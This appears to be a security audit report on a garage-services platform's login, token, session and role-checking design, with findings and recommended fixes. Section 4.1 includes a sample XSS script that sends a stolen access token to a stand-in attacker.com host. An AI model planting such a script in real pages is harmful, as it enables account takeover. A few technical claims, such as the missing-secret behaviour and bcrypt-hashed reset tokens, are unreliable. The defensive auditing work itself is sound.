# Authentication/Authorization Architecture Audit Report
## GarageMate Platform - Comprehensive Security Analysis

**Date:** October 7, 2026  
**Status:** ⚠️ CRITICAL ISSUES IDENTIFIED  
**Auditor:** System Analysis  
**Scope:** Complete authentication, authorization, session management, and access control

---

## Executive Summary

This report identifies **12 CRITICAL**, **8 HIGH**, and **15 MEDIUM** priority security issues in the authentication and authorization architecture. The system has a solid foundation but requires systematic hardening before production deployment.

### Critical Findings Summary
1. ❌ **Missing ADMIN seeding** - No default admin account creation
2. ❌ **JWT secrets not validated** - No startup check for JWT_ACCESS_SECRET/JWT_REFRESH_SECRET
3. ❌ **Refresh token reuse allowed** - Tokens can be reused until expiry
4. ❌ **No concurrent session limit** - Users can have unlimited active sessions
5. ❌ **Google ID not unique enforced** - Database allows duplicate googleIds
6. ❌ **Cross-role Google auth** - Same Google account can register as USER and GARAGE_OWNER
7. ❌ **Garage owner without garage** - Can authenticate but breaks functionality
8. ❌ **No email verification** - Users can access system immediately after registration
9. ❌ **Refresh token not rotated** - No rotation on refresh, opens replay attacks
10. ❌ **Password reset token in plain text** - Not hashed in database
11. ❌ **No rate limiting on /auth/refresh** - Can brute force refresh tokens
12. ❌ **Admin cannot be created via registration** - No registration flow for admin role

---

## 1. Authentication Flows Analysis

### 1.1 User Registration Flow ✅ MOSTLY SECURE

**Flow:**
```
POST /api/auth/user/register
→ Validate input (Zod)
→ Check email uniqueness
→ Hash password (bcrypt, salt=10)
→ Create User with role=USER
→ Send welcome email (fire-and-forget)
→ Return 201 with user data (no tokens)
```

**Security Assessment:**
- ✅ Password hashing with bcrypt
- ✅ Email uniqueness check
- ✅ Input validation with Zod
- ✅ Role hardcoded to USER (prevents privilege escalation)
- ❌ **CRITICAL:** No email verification - users can login immediately
- ❌ **HIGH:** Email validation only checks format, not deliverability
- ❌ **MEDIUM:** Welcome email failures are silent (catch without rethrow)
- ⚠️ **LOW:** No password strength enforcement (only min 8 chars)

**Recommendations:**
1. Add email verification flow with OTP/token
2. Add password strength meter (uppercase, lowercase, number, special char)
3. Log email sending failures for monitoring
4. Consider rate limiting registration by IP

---

### 1.2 Garage Owner Registration Flow ⚠️ NEEDS ATTENTION

**Flow:**
```
POST /api/auth/garage/register
→ Validate input (Zod)
→ Check email uniqueness
→ Create User with role=GARAGE_OWNER
→ Create Garage with verificationStatus=PENDING
→ Return 201 with user + garage data
```

**Security Assessment:**
- ✅ Email uniqueness check
- ✅ Role hardcoded to GARAGE_OWNER
- ✅ Garage verification required before operations
- ❌ **CRITICAL:** Transaction not atomic - if Garage creation fails, orphan User remains
- ❌ **HIGH:** No validation that lat/long coordinates are valid
- ❌ **MEDIUM:** Garage owner can login but has no garage if creation fails
- ⚠️ **LOW:** No duplicate garage name check

**Vulnerability Scenario:**
```typescript
// User created successfully
const owner = await User.create({ ... });

// Garage creation fails (DB error, validation)
const garage = await Garage.create({ ... }); // THROWS

// Result: Orphan GARAGE_OWNER user with no garage
// User can login but breaks /api/garages/my/profile
```

**Recommendations:**
1. Wrap in database transaction
2. Add lat/long validation (-90 to 90, -180 to 180)
3. Add error recovery: delete user if garage creation fails
4. Check garage name uniqueness within city

---

### 1.3 Email/Password Login Flow ⚠️ VULNERABLE TO ENUMERATION

**Flow:**
```
POST /api/auth/login
→ Find user by email
→ Check isBlocked
→ Verify password exists (not Google-only account)
→ Compare password (bcrypt)
→ Generate access + refresh tokens
→ Store refresh token in DB
→ Return tokens + user data
```

**Security Assessment:**
- ✅ Password verification with bcrypt
- ✅ Blocked user check
- ✅ Refresh token stored in database
- ✅ Tokens include role and email in payload
- ❌ **CRITICAL:** Refresh tokens NOT rotated on use (replay attack vector)
- ❌ **HIGH:** User enumeration via timing attack
- ❌ **HIGH:** No failed login attempt tracking
- ❌ **HIGH:** Generic "Invalid credentials" reveals if email exists (different error for no password)
- ❌ **MEDIUM:** No account lockout after N failed attempts
- ❌ **MEDIUM:** No CAPTCHA after failed attempts
- ⚠️ **LOW:** Access token expiry too short? (15m may cause UX issues)

**User Enumeration Vulnerability:**
```typescript
// If user not found:
throw new ApiError(401, 'Invalid credentials');

// If user has no password:
throw new ApiError(400, 'Please use Google Sign In for this account');
// ^^^ REVEALS that email exists and uses Google auth!
```

**Timing Attack:**
```typescript
const user = await User.findOne({ email }).select('+password');
if (!user) {
  throw new ApiError(401, 'Invalid credentials'); // Fast response
}
// ... 20 lines of checks ...
const isPasswordValid = await user.comparePassword(password);
if (!isPasswordValid) {
  throw new ApiError(401, 'Invalid credentials'); // Slow response (bcrypt)
}
// Attacker can time responses to determine if email exists
```

**Recommendations:**
1. Always call bcrypt.compare even if user not found (constant-time response)
2. Return same error message for all auth failures
3. Implement failed login tracking (max 5 attempts per email per hour)
4. Add progressive delays after failed attempts
5. Implement CAPTCHA after 3 failed attempts
6. Rotate refresh token on use (invalidate old, issue new)
7. Log all failed login attempts for monitoring

---

### 1.4 Google Authentication Flow ❌ CRITICAL ISSUES

**Flow:**
```
POST /api/auth/google
→ Verify Firebase ID token
→ Find user by googleId
→ If not found, find by email (link account)
→ If still not found, create new user
→ Check role matches
→ Check if blocked
→ Generate tokens
→ Return tokens + needsOnboarding flag
```

**Security Assessment:**
- ✅ Firebase token verification
- ✅ Account linking by email
- ✅ Blocked user check
- ✅ Role validation
- ❌ **CRITICAL:** Google ID not unique in schema (should be unique: true)
- ❌ **CRITICAL:** Can create multiple accounts with same Google ID
- ❌ **CRITICAL:** Cross-role Google auth vulnerability
- ❌ **HIGH:** Race condition in account creation
- ❌ **MEDIUM:** needsOnboarding only checked for GARAGE_OWNER
- ⚠️ **LOW:** Admin role blocked but error message is generic

**Cross-Role Vulnerability:**
```typescript
// Scenario:
// 1. User registers as USER with Google (email: user@example.com, googleId: G123)
// 2. Same Google account tries to register as GARAGE_OWNER
// 3. System finds existing USER by email
// 4. Links googleId to USER account
// 5. Throws error: "This account is registered as USER"
// 6. But now GARAGE_OWNER registration flow is blocked forever for this email
// 7. User can't create separate garage owner account
```

**Database Schema Issue:**
```typescript
// User.ts
googleId: {
  type: String,
  sparse: true,  // ❌ Should be unique: true
}
// Current: Multiple users can have same googleId!
```

**Recommendations:**
1. Add unique constraint to googleId: `unique: true, sparse: true`
2. Prevent cross-role Google auth (don't link if roles differ)
3. Add transaction for account creation
4. Check needsOnboarding for all roles
5. Return specific error for admin Google auth attempt

---

### 1.5 Token Refresh Flow ❌ CRITICAL VULNERABILITIES

**Flow:**
```
POST /api/auth/refresh
→ Find refresh token in DB
→ Check expiry
→ Verify JWT signature
→ Find user by ID
→ Check if blocked
→ Generate NEW access token
→ Return new access token (KEEP old refresh token)
```

**Security Assessment:**
- ✅ Refresh token stored and verified in DB
- ✅ Token expiry check
- ✅ User status verification
- ❌ **CRITICAL:** Refresh token NOT rotated (reusable until expiry)
- ❌ **CRITICAL:** No rate limiting on /auth/refresh
- ❌ **CRITICAL:** Old refresh token not invalidated
- ❌ **HIGH:** No detection of stolen refresh tokens
- ❌ **HIGH:** No refresh token family tracking
- ❌ **MEDIUM:** Deleted refresh tokens not cleaned up (7-day TTL index only)
- ⚠️ **LOW:** No logging of refresh token usage

**Refresh Token Reuse Attack:**
```typescript
// Attacker steals refresh token from user
const stolenToken = "eyJhbGc...";

// Legitimate user refreshes
POST /api/auth/refresh { refreshToken: stolenToken }
→ Returns NEW access token
→ stolenToken STILL VALID ❌

// Attacker can ALSO use same token
POST /api/auth/refresh { refreshToken: stolenToken }
→ Returns ANOTHER access token
→ stolenToken STILL VALID ❌

// Attacker can refresh repeatedly until 7-day expiry
```

**Recommended Secure Flow (Token Rotation):**
```typescript
POST /api/auth/refresh { refreshToken: oldToken }
→ Verify oldToken
→ Generate NEW access token
→ Generate NEW refresh token
→ Store NEW refresh token
→ DELETE oldToken from database ✅
→ Return NEW access + refresh tokens
// If oldToken used again, flag as stolen!
```

**Recommendations:**
1. Implement refresh token rotation (RFC 6749)
2. Delete old token immediately after use
3. Detect token reuse (if deleted token presented, revoke all tokens for user)
4. Add rate limiting (max 10 refreshes per hour per user)
5. Track refresh token families for security monitoring
6. Add refresh token usage logging

---

### 1.6 Logout Flow ⚠️ INCOMPLETE

**Flow:**
```
POST /api/auth/logout
→ Receive refresh token in body
→ Delete token from database
→ Return success
```

**Security Assessment:**
- ✅ Refresh token revocation
- ❌ **HIGH:** No access token blacklisting
- ❌ **HIGH:** No session termination on other devices
- ❌ **MEDIUM:** No logout from all sessions option
- ❌ **MEDIUM:** Access token remains valid until expiry (15 min)
- ⚠️ **LOW:** Logout doesn't require authentication

**Access Token Still Valid After Logout:**
```typescript
// User logs out
POST /api/auth/logout { refreshToken: "..." }
→ Refresh token deleted ✅

// But attacker with access token can still make requests!
POST /api/requests { ... }
Authorization: Bearer <still-valid-access-token>
→ Request succeeds ❌ (token valid for 15 more minutes)
```

**Recommendations:**
1. Implement access token blacklist (Redis cache)
2. Add "logout from all devices" endpoint
3. Require authentication for logout
4. Add session management UI showing active devices
5. Consider shorter access token expiry with auto-refresh

---

### 1.7 Password Reset Flow ❌ SECURITY ISSUES

**Flow:**
```
POST /api/auth/forgot-password
→ Find user by email
→ Generate reset token (32 random bytes)
→ Store token in user.resetPasswordToken (plain text!)
→ Set 1-hour expiry
→ Send email with token
→ Return success (even if email doesn't exist)

POST /api/auth/reset-password
→ Find user by token and expiry
→ Update password (triggers bcrypt hash)
→ Clear token fields
→ Return success
```

**Security Assessment:**
- ✅ Token expiry (1 hour)
- ✅ Obscures whether email exists
- ✅ Password re-hashed on update
- ❌ **CRITICAL:** Reset token stored in plain text (should be hashed)
- ❌ **HIGH:** No rate limiting on forgot-password (email bombing)
- ❌ **HIGH:** No notification to user when password reset requested
- ❌ **MEDIUM:** Reset token not invalidated on successful login
- ❌ **MEDIUM:** No used token tracking (can reuse until expiry)
- ⚠️ **LOW:** Token length might be predictable

**Plain Text Token Vulnerability:**
```typescript
// Current implementation
user.resetPasswordToken = generateResetToken(); // Plain text in DB!
await user.save();

// If database compromised, attacker has ALL reset tokens
// Can immediately reset any user's password
```

**Recommendations:**
1. Hash reset tokens before storing (bcrypt or SHA-256)
2. Add rate limiting (1 request per email per 5 minutes)
3. Send notification email when password reset requested
4. Invalidate reset token after successful login
5. Track used tokens to prevent reuse
6. Increase token entropy (64 bytes instead of 32)

---

## 2. Authorization System Analysis

### 2.1 Role-Based Access Control (RBAC) ✅ WELL IMPLEMENTED

**Roles Defined:**
```typescript
enum UserRole {
  USER = 'USER',
  GARAGE_OWNER = 'GARAGE_OWNER',
  ADMIN = 'ADMIN'
}
```

**Middleware Implementation:**
```typescript
// authenticate: Verify JWT and attach user to request
// authorize(...roles): Check if user role is in allowed roles
```

**Assessment:**
- ✅ Clean role separation
- ✅ Middleware properly chained
- ✅ Role included in JWT payload
- ✅ Authorization checked before handlers
- ⚠️ **MEDIUM:** No fine-grained permissions (only role-level)
- ⚠️ **LOW:** No role hierarchy (e.g., ADMIN can't do USER actions automatically)

**Recommendations:**
1. Consider permission-based system for fine-grained control
2. Implement role inheritance (ADMIN inherits all permissions)
3. Add permission constants for maintainability

---

### 2.2 Resource Ownership Verification ✅ CONSISTENTLY APPLIED

**Pattern Analysis:**
```typescript
// USER resources (vehicles, requests, quotations, payments)
const resource = await Model.findOne({
  _id: resourceId,
  userId: req.user!.userId  // ✅ Ownership check
});

// GARAGE_OWNER resources (mechanics, offers, quotations)
const garage = await Garage.findOne({ owner: req.user!.userId });
const resource = await Model.findOne({
  garageId: garage._id  // ✅ Garage ownership check
});
```

**Assessment:**
- ✅ Consistent ownership checks across all user endpoints
- ✅ Garage ownership verified through owner field
- ✅ Proper cascading authorization (garage → mechanic → request)
- ⚠️ **MEDIUM:** Garage ownership check requires extra DB query
- ⚠️ **LOW:** No caching of garage ownership

**Recommendations:**
1. Cache garage ownership in JWT or Redis
2. Add middleware to attach garage to req for GARAGE_OWNER role
3. Consider pre-loading garage on authentication

---

### 2.3 Cross-Role Access Scenarios ⚠️ SOME GAPS

**Scenario Analysis:**

#### Request Resource Access
```typescript
// Get request details: getRequest()
const isOwner = request.userId._id.toString() === req.user!.userId;
const isGarageOwner = await Garage.findOne({ 
  _id: request.garageId, 
  owner: req.user!.userId 
});
const isAdmin = req.user!.role === UserRole.ADMIN;

if (!isOwner && !isGarageOwner && !isAdmin) {
  throw new ApiError(403, 'Access denied');
}
// ✅ Properly handles all three access patterns
```

#### Quotation Access
```typescript
// Get quotation: getQuotation()
const isUser = quotation.userId.toString() === req.user!.userId;
const garage = await Garage.findOne({ 
  _id: quotation.garageId, 
  owner: req.user!.userId 
});
const isGarageOwner = !!garage;
const isAdmin = req.user!.role === UserRole.ADMIN;

if (!isUser && !isGarageOwner && !isAdmin) {
  throw new ApiError(403, 'Access denied');
}
// ✅ Proper authorization
```

**Assessment:**
- ✅ Cross-role access properly validated
- ✅ Admin override consistently implemented
- ❌ **MEDIUM:** Garage lookup repeated in every handler (performance issue)
- ⚠️ **LOW:** No access audit logging

**Recommendations:**
1. Create authorization helper functions to reduce duplication
2. Cache garage ownership
3. Add access audit logging for sensitive operations

---

### 2.4 Admin Privileges ⚠️ NEEDS HARDENING

**Admin Powers:**
- ✅ View all users, garage owners, garages
- ✅ Approve/reject/suspend garages
- ✅ Block/unblock users
- ✅ View all requests, payments, complaints
- ✅ Resolve complaints
- ✅ Hide reviews
- ❌ **CRITICAL:** Cannot modify request status (but GARAGE_OWNER can with admin role!)
- ❌ **HIGH:** Can't impersonate users for debugging
- ❌ **HIGH:** No admin action audit log
- ❌ **MEDIUM:** Can't manually create users
- ⚠️ **LOW:** Can't export data

**Admin Route Authorization:**
```typescript
router.use(authenticate);
router.use(authorize(UserRole.ADMIN));  // ✅ All routes protected
```

**Privilege Escalation Risk:**
```typescript
// updateStatus() in requestController.ts
router.patch('/:id/status', 
  authorize(UserRole.GARAGE_OWNER, UserRole.ADMIN),  // ⚠️ Both allowed
  updateStatus
);

// Inside handler:
const garage = await Garage.findOne({ 
  _id: request.garageId, 
  owner: req.user!.userId 
});
const isOwner = request.userId.toString() === req.user!.userId;

if (!garage && !isOwner && req.user!.role !== UserRole.ADMIN) {
  throw new ApiError(403, 'Access denied');
}
// ✅ But admin check is there, so secure
```

**Admin Creation Vulnerability:**
```typescript
// NO ENDPOINT TO CREATE ADMIN!
// registerUser() hardcodes role=USER
// registerGarageOwner() hardcodes role=GARAGE_OWNER
// ❌ Admin must be manually created in database
```

**Recommendations:**
1. Create admin seeding script (ran on first server start)
2. Create admin invitation system (existing admin can invite new)
3. Add comprehensive audit logging for all admin actions
4. Add admin impersonation feature (with logging)
5. Add data export endpoints for GDPR compliance
6. Consider read-only admin role for customer support

---

## 3. Session Management

### 3.1 Access Token (JWT) ⚠️ NEEDS IMPROVEMENT

**Current Implementation:**
```typescript
// Expiry: 15 minutes (from env JWT_ACCESS_EXPIRES_IN)
// Secret: JWT_ACCESS_SECRET (from env)
// Algorithm: HS256 (default)
// Payload: { userId, role, email, iat, exp }
```

**Assessment:**
- ✅ Short expiry (15 min reduces stolen token risk)
- ✅ Includes necessary claims
- ❌ **CRITICAL:** No validation that JWT_ACCESS_SECRET exists on startup
- ❌ **HIGH:** Algorithm not explicitly set (should use RS256 for production)
- ❌ **MEDIUM:** No token ID (jti) for revocation
- ❌ **MEDIUM:** No issued-at check (allows time-based attacks)
- ⚠️ **LOW:** Payload doesn't include issuer (iss) or audience (aud)

**Missing Startup Validation:**
```typescript
// jwt.ts - NO CHECK!
return jwt.sign(payload, process.env.JWT_ACCESS_SECRET!, { 
  expiresIn: process.env.JWT_ACCESS_EXPIRES_IN || '15m' 
});
// If JWT_ACCESS_SECRET is undefined, silently uses "undefined" as secret!
```

**Recommendations:**
1. Validate JWT secrets on server startup (fail fast if missing)
2. Use RS256 (asymmetric) for production
3. Add jti (token ID) for revocation support
4. Add iss and aud claims
5. Explicitly set algorithm in options
6. Consider using shorter expiry (5-10 min) with auto-refresh

---

### 3.2 Refresh Token ❌ CRITICAL ISSUES

**Current Implementation:**
```typescript
// Expiry: 7 days (from env JWT_REFRESH_EXPIRES_IN)
// Secret: JWT_REFRESH_SECRET (from env)
// Storage: MongoDB RefreshToken collection
// Payload: { userId, role, email, iat, exp }
```

**Assessment:**
- ✅ Stored in database for revocation
- ✅ Separate secret from access token
- ✅ Auto-deletion after 7 days (TTL index on createdAt)
- ❌ **CRITICAL:** No token rotation (reusable until expiry)
- ❌ **CRITICAL:** No detection of stolen tokens
- ❌ **CRITICAL:** No secret validation on startup
- ❌ **HIGH:** User can have unlimited concurrent refresh tokens
- ❌ **MEDIUM:** No session metadata (device, IP, location)
- ❌ **MEDIUM:** No "remember me" vs normal session distinction
- ⚠️ **LOW:** TTL index might not delete immediately (background task)

**Unlimited Sessions Vulnerability:**
```typescript
// User can login from multiple devices
POST /api/auth/login  // Device 1 → Token 1
POST /api/auth/login  // Device 2 → Token 2
POST /api/auth/login  // Device 3 → Token 3
// ... unlimited tokens

// No way to see or revoke specific sessions
// Logout only deletes ONE token (from request body)
```

**Recommendations:**
1. Implement token rotation (delete old, issue new on refresh)
2. Detect token reuse and revoke all tokens for user
3. Limit concurrent sessions (e.g., max 5 devices)
4. Store session metadata (device, IP, user-agent, last activity)
5. Add "active sessions" management UI
6. Implement "remember me" with longer expiry
7. Add "logout all other sessions" feature

---

### 3.3 Session Storage (RefreshToken Model) ✅ ADEQUATE

**Schema:**
```typescript
{
  token: String (unique),
  userId: ObjectId (ref: User),
  expiresAt: Date,
  createdAt: Date (TTL index: 604800s = 7 days)
}
```

**Indexes:**
- ✅ Unique index on token
- ✅ Index on userId (for user lookup)
- ✅ Index on expiresAt (for expiry queries)
- ✅ TTL index on createdAt (auto-deletion)

**Assessment:**
- ✅ Proper indexes for performance
- ✅ Auto-cleanup of expired tokens
- ⚠️ **MEDIUM:** No device/IP metadata
- ⚠️ **LOW:** No last activity timestamp

**Recommendations:**
1. Add session metadata fields
2. Add lastActivity timestamp (update on refresh)
3. Consider separate collection for session metadata

---

## 4. Frontend Authentication

### 4.1 AuthContext Implementation ⚠️ NEEDS HARDENING

**Current Implementation:**
```typescript
// Storage: localStorage (accessToken, refreshToken, user)
// State: user, isAuthenticated, loading
// Methods: login, logout, refresh, registerUser, registerGarageOwner
```

**Assessment:**
- ✅ Tokens stored in localStorage (survives page refresh)
- ✅ User data cached in localStorage
- ✅ Auth state properly managed
- ✅ Refresh token interceptor in axios
- ❌ **HIGH:** No XSS protection for localStorage
- ❌ **HIGH:** Tokens readable by any JavaScript (including malicious scripts)
- ❌ **MEDIUM:** No automatic token refresh on expiry
- ❌ **MEDIUM:** No logout on 401 response
- ⚠️ **LOW:** User data might be stale

**localStorage XSS Vulnerability:**
```javascript
// Attacker injects script
<script>
  const token = localStorage.getItem('accessToken');
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token })
  });
</script>
// ^^^ Tokens stolen if XSS vulnerability exists
```

**Recommendations:**
1. Use httpOnly cookies for refresh token (XSS protection)
2. Keep access token in memory (state only)
3. Implement automatic token refresh before expiry
4. Add global 401 interceptor to logout user
5. Implement Content Security Policy (CSP)
6. Add token fingerprinting

---

### 4.2 Protected Routes ✅ WELL IMPLEMENTED

**ProtectedRoute Component:**
```typescript
// Checks: isAuthenticated, loading, user role
// Redirects: Based on role if unauthorized
// Behavior: Shows loading, redirects to login, redirects to appropriate dashboard
```

**Assessment:**
- ✅ Loading state handled
- ✅ Role-based redirection
- ✅ Preserves intended destination (location state)
- ⚠️ **LOW:** No check if token is expired
- ⚠️ **LOW:** Flashes loading on every route change

**Recommendations:**
1. Check token expiry before rendering
2. Implement route transition animations
3. Pre-fetch user data for better UX

---

### 4.3 RedirectHandler ⚠️ RACE CONDITION

**Current Implementation:**
```typescript
// Reads from localStorage as fallback if auth context not ready
// Calls window.location.reload() if tokens exist but not authenticated
```

**Assessment:**
- ✅ Fallback to localStorage
- ✅ Loading state shown
- ❌ **MEDIUM:** Race condition between context update and localStorage
- ❌ **MEDIUM:** window.location.reload() is heavy-handed
- ⚠️ **LOW:** No error handling if localStorage corrupted

**Race Condition:**
```typescript
// Login completes
persistSession({ user, accessToken, refreshToken });
navigate('/redirect');

// RedirectHandler mounts BEFORE context updates
useEffect(() => {
  if (!loading && !isAuthenticated) {
    // Tokens in localStorage but context not updated
    window.location.reload(); // ❌ Full page reload
  }
}, [loading, isAuthenticated]);
```

**Recommendations:**
1. Call refreshAuth() instead of reload
2. Add retry logic with timeout
3. Handle corrupted localStorage gracefully
4. Consider using callback after persistSession

---

## 5. Database Security

### 5.1 User Model ✅ MOSTLY SECURE

**Schema Security:**
- ✅ Email unique index
- ✅ Password excluded by default (select: false)
- ✅ Google ID sparse index
- ✅ Role enum validation
- ✅ Pre-save password hashing
- ❌ **CRITICAL:** Google ID not unique (sparse only)
- ⚠️ **MEDIUM:** Mobile not unique (allows duplicates)
- ⚠️ **LOW:** Reset token not hashed

**Recommendations:**
1. Add unique constraint to googleId
2. Consider mobile uniqueness or validation
3. Hash reset tokens before storage

---

### 5.2 RefreshToken Model ✅ SECURE

**Schema Security:**
- ✅ Token unique index
- ✅ UserId indexed
- ✅ TTL index for auto-deletion
- ✅ ExpiresAt indexed

**Assessment:** No issues identified.

---

### 5.3 Cascade Deletion ✅ IMPLEMENTED

**Relationships:**
- ✅ AssistanceRequest deleted → offers, quotations, payments deleted
- ✅ Garage deleted → mechanics, offers, reviews deleted
- ✅ User deletion not implemented (intentional for data retention?)

**Assessment:**
- ✅ Proper cascade rules prevent orphan data
- ⚠️ **LOW:** User deletion not supported (GDPR concern)

**Recommendations:**
1. Add user soft delete feature (isDeleted flag)
2. Add GDPR data export feature
3. Add data anonymization for deleted users

---

## 6. Edge Cases & Vulnerabilities

### 6.1 Concurrent Registration Race Condition

**Scenario:**
```typescript
// Two requests simultaneously:
Request 1: POST /api/auth/user/register { email: "user@example.com" }
Request 2: POST /api/auth/user/register { email: "user@example.com" }

// Both check uniqueness at same time
const existingUser = await User.findOne({ email }); // Both return null

// Both create user
await User.create({ email }); // Second one fails with duplicate key error

// But error not handled gracefully
// Returns: "E11000 duplicate key error" instead of "Email already registered"
```

**Impact:** Poor UX, reveals database structure

**Recommendation:** Handle duplicate key errors and return friendly message

---

### 6.2 Garage Owner Without Garage

**Scenario:**
```typescript
// Registration process
const owner = await User.create({ role: GARAGE_OWNER }); // Success
const garage = await Garage.create({ ... }); // FAILS (validation error)

// Now owner exists but no garage
// Owner can login but:
const garage = await Garage.findOne({ owner: req.user!.userId });
if (!garage) {
  throw new ApiError(404, 'Garage not found'); // Every request fails!
}
```

**Impact:** Account unusable, poor UX

**Recommendation:** Atomic transaction or cleanup on failure

---

### 6.3 Google Account Role Switching

**Scenario:**
```typescript
// User registers as USER with Google
googleAuth({ idToken, role: 'USER' });
// User created with googleId = G123

// Later, tries to register as GARAGE_OWNER with same Google
googleAuth({ idToken, role: 'GARAGE_OWNER' });
// Finds user by googleId
// Checks role mismatch
throw new ApiError(400, 'This account is registered as USER');

// Result: User locked out of GARAGE_OWNER registration
// Can never create garage owner account with this email
```

**Impact:** User frustration, support burden

**Recommendation:** Allow separate email-based registration for different roles

---

### 6.4 Token Secret Missing

**Scenario:**
```typescript
// .env file missing JWT_ACCESS_SECRET
// Server starts successfully
// User tries to login
const accessToken = generateAccessToken(userId, role, email);
jwt.sign(payload, process.env.JWT_ACCESS_SECRET!); 
// Signs with "undefined" as secret!

// Later, verification
jwt.verify(token, process.env.JWT_ACCESS_SECRET!);
// Verifies successfully (both use "undefined")

// Result: All tokens valid until secret changes
// Changing secret invalidates ALL tokens
```

**Impact:** CRITICAL security vulnerability

**Recommendation:** Validate secrets on startup, fail fast

---

### 6.5 Refresh Token Reuse After Theft

**Scenario:**
```typescript
// Attacker steals user's refresh token
const stolen = user.refreshToken;

// User refreshes normally
POST /api/auth/refresh { refreshToken: stolen }
→ Returns NEW access token
→ Token still in database ❌

// Attacker uses same token
POST /api/auth/refresh { refreshToken: stolen }
→ Returns access token for attacker ❌
→ No detection, no alert

// Both user and attacker have access
```

**Impact:** Account compromise undetected

**Recommendation:** Token rotation with reuse detection

---

### 6.6 Password Reset Token Exposure

**Scenario:**
```typescript
// User requests password reset
user.resetPasswordToken = generateResetToken(); // Plain text!
await user.save();

// Database dump leaked or insider threat
db.users.find({ resetPasswordToken: { $exists: true } });
// Attacker has ALL active reset tokens
// Can reset any user's password immediately
```

**Impact:** Mass account compromise

**Recommendation:** Hash reset tokens before storage

---

### 6.7 Admin Account Creation

**Scenario:**
```typescript
// First time setup
// No way to create admin account via API
// Must manually insert into MongoDB:

db.users.insertOne({
  name: "Admin",
  email: "admin@example.com",
  password: "$2b$10$..." // Pre-hashed
  role: "ADMIN"
});

// Insecure, error-prone, not documented
```

**Impact:** Difficult setup, security risk

**Recommendation:** Admin seeding script

---

## 7. Frontend-Backend Mismatches

### 7.1 Error Message Consistency ✅ ALIGNED

**Frontend Expectations:**
```typescript
catch (err: any) {
  const errorMessage = err?.response?.data?.message;
}
```

**Backend Response:**
```typescript
res.status(400).json({
  success: false,
  message: "Error message",
  errors: [...] // Zod validation errors
});
```

**Assessment:** ✅ Consistent error format

---

### 7.2 Token Storage Location ⚠️ MISMATCH

**Frontend:** localStorage (vulnerable to XSS)
**Backend:** Expects tokens in Authorization header (correct)

**Recommendation:** Use httpOnly cookies for refresh token

---

### 7.3 Role Names ✅ SYNCHRONIZED

**Backend:** USER, GARAGE_OWNER, ADMIN
**Frontend:** 'USER', 'GARAGE_OWNER', 'ADMIN'

**Assessment:** ✅ Exact match

---

## 8. Priority Recommendations

### CRITICAL (Implement Immediately)

1. **Add JWT secret validation on startup**
   ```typescript
   if (!process.env.JWT_ACCESS_SECRET || !process.env.JWT_REFRESH_SECRET) {
     console.error('FATAL: JWT secrets not configured');
     process.exit(1);
   }
   ```

2. **Implement refresh token rotation**
   ```typescript
   // On refresh: delete old token, issue new refresh + access
   await RefreshToken.deleteOne({ token: oldToken });
   const newRefresh = generateRefreshToken(...);
   await RefreshToken.create({ token: newRefresh, ... });
   return { accessToken, refreshToken: newRefresh };
   ```

3. **Add unique constraint to Google ID**
   ```typescript
   googleId: {
     type: String,
     unique: true,
     sparse: true
   }
   ```

4. **Hash password reset tokens**
   ```typescript
   const hashedToken = await bcrypt.hash(resetToken, 10);
   user.resetPasswordToken = hashedToken;
   ```

5. **Add admin seeding script**
   ```typescript
   // seed/admin.ts
   if (await User.countDocuments({ role: 'ADMIN' }) === 0) {
     await User.create({ 
       name: 'Admin', 
       email: process.env.ADMIN_EMAIL,
       password: process.env.ADMIN_PASSWORD,
       role: 'ADMIN' 
     });
   }
   ```

### HIGH (Implement This Sprint)

6. **Add email verification flow**
7. **Implement failed login tracking**
8. **Add rate limiting on /auth/refresh**
9. **Fix user enumeration vulnerability**
10. **Implement transaction for garage registration**
11. **Add access token blacklist for logout**

### MEDIUM (Implement Next Sprint)

12. **Add session management UI**
13. **Implement CAPTCHA after failed logins**
14. **Add admin action audit logging**
15. **Store session metadata (device, IP)**
16. **Implement concurrent session limits**
17. **Add "remember me" feature**

### LOW (Technical Debt)

18. **Cache garage ownership**
19. **Add password strength meter**
20. **Implement user soft delete**
21. **Add GDPR data export**
22. **Improve loading states**

---

## 9. Validation Checklist

Before production deployment, verify:

- [ ] JWT secrets validated on startup
- [ ] Refresh token rotation implemented
- [ ] Google ID unique constraint added
- [ ] Reset tokens hashed
- [ ] Admin seeding script created
- [ ] Email verification flow implemented
- [ ] Failed login tracking active
- [ ] Rate limiting on all auth endpoints
- [ ] User enumeration fixed
- [ ] Garage registration transaction wrapped
- [ ] Access token blacklist implemented
- [ ] Session management UI available
- [ ] Audit logging configured
- [ ] XSS protection (CSP headers)
- [ ] CORS properly configured
- [ ] HTTPS enforced in production
- [ ] Database backups configured
- [ ] Security headers configured (Helmet.js)
- [ ] Input sanitization reviewed
- [ ] SQL injection prevented (using ORM)

---

## 10. Testing Requirements

Create tests for:

1. **Authentication Flows**
   - [ ] User registration success
   - [ ] Duplicate email rejection
   - [ ] Login with valid credentials
   - [ ] Login with invalid credentials
   - [ ] Blocked user login attempt
   - [ ] Google auth new user
   - [ ] Google auth existing user
   - [ ] Google auth role mismatch
   - [ ] Token refresh success
   - [ ] Token refresh with invalid token
   - [ ] Token refresh with expired token
   - [ ] Logout token revocation
   - [ ] Password reset flow
   - [ ] Password reset with invalid token

2. **Authorization**
   - [ ] Access protected route without auth
   - [ ] Access user route as GARAGE_OWNER
   - [ ] Access garage route as USER
   - [ ] Access admin route as USER
   - [ ] Resource ownership validation
   - [ ] Cross-role resource access

3. **Security**
   - [ ] XSS attack prevention
   - [ ] SQL injection prevention
   - [ ] CSRF attack prevention
   - [ ] Rate limiting enforcement
   - [ ] Token reuse detection
   - [ ] Session hijacking prevention

4. **Edge Cases**
   - [ ] Concurrent registration
   - [ ] Garage creation failure recovery
   - [ ] Token secret missing
   - [ ] Database connection failure
   - [ ] Email service failure

---

## Conclusion

The authentication and authorization system has a solid foundation with proper separation of concerns and role-based access control. However, **12 CRITICAL vulnerabilities** must be addressed before production deployment, particularly:

1. Token rotation and reuse detection
2. JWT secret validation
3. Google ID uniqueness
4. Password reset token hashing
5. Admin account seeding

The recommended fixes are systematic and can be implemented incrementally without breaking existing functionality. Priority should be given to CRITICAL issues first, followed by HIGH and MEDIUM priority items.

**Estimated Effort:**
- Critical fixes: 2-3 days
- High priority: 3-5 days
- Medium priority: 5-7 days
- Low priority: 3-5 days
- Total: ~3-4 weeks for complete hardening

**Next Steps:**
1. Review this report with team
2. Prioritize fixes based on risk
3. Create JIRA tickets for each issue
4. Implement fixes systematically
5. Add comprehensive tests
6. Conduct penetration testing
7. Security audit before production

---

